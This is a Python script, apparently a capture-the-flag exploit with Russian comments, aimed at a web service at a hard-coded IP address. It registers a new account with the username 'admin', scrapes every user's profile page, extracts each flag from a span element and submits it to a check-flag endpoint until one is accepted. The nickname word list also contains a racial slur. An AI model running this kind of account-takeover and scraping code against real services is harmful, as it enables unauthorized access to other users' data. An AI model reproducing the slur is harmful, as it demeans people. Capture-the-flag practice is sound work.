import requests
from bs4 import BeautifulSoup
import random
import time

session = requests.Session()
url = "http://62.181.44.12:3000"


adjectives = ["swift", "brave", "clever", "silent", "golden"]
nouns = ["eagle", "shadow", "river", "nigger", "mountain", "star"]
special_chars = ["_", "-", "."]


def random_nickname():
    adj = random.choice(adjectives)
    noun = random.choice(nouns)
    char = random.choice(special_chars)
    num = random.randint(1,9999)

    return f"{adj}_{noun}_{char}_{num}"

def flag_checker(flag):
    urlz = 'http://62.181.44.12:3000/check-flag?flag='
    request = session.get(url=urlz+flag)
    if (request.text == "Верный флаг"):
        return 1
    return 0



# регистрируемся с указанием юзернейма - админ
full_name = random_nickname()

username = "admin"
email = full_name + "@gmail.com"
password = "123"

reg_data = {"username": username,
            "email" : email,
            "full_name": full_name,
            "password": password,
            "confirm_password": password}

registration_post = session.post(url+"/auth/signup", data=reg_data)
while True:
    # достаем страницы всех пользователей и из этих страниц берем флаги
    list_all_users_get_html = session.get(url).text
    soup_users = BeautifulSoup(list_all_users_get_html, 'lxml')

    view_profile_tags = soup_users.find_all('a', class_="btn btn-view-profile")
    list_of_paths = []
    for data in view_profile_tags:
        list_of_paths.append(data['href'])

    key = "flag"
    flags = []
    for i in list_of_paths:
        done = 0 
        #print(f"user_path_is -- {i}")
        get_user_info = session.get(url=url+i) # получаем html-страницу юзера
        soup = BeautifulSoup(get_user_info.text, 'lxml')
        flag = soup.find_all("span") # достаем элемент, где лежит флаг
        if len(flag) >= 4: # не у всех юзеров есть элемент флага, таких отбрасываем
            flag_text = str(flag[3]) 
            flag = str(flag[3].text)
            done = flag_checker(flag)
            print(f"Подставляю найденный флаг ({flag})...")
            if (done):
                print(f"Ура! Этот флаг верный! Завершаю работу...")
                time.sleep(15)
                break
    